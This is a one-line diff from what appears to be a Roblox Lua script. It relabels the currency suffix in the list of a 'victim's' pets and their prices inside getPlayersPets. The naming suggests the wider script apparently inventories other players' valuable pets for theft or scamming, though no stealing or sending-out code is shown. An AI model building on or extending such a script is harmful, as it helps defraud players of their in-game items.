@@ -359,7 +359,7 @@ local function getPlayersPets()
         local petPrice = PET_VALUES2[petName] or 0
         totalValue += petPrice
 
-        table.insert(victimPetTable, string.format("%s - %sТенге", petName, petPrice))
+        table.insert(victimPetTable, string.format("%s - %sValue", petName, petPrice))
     end
 end
 
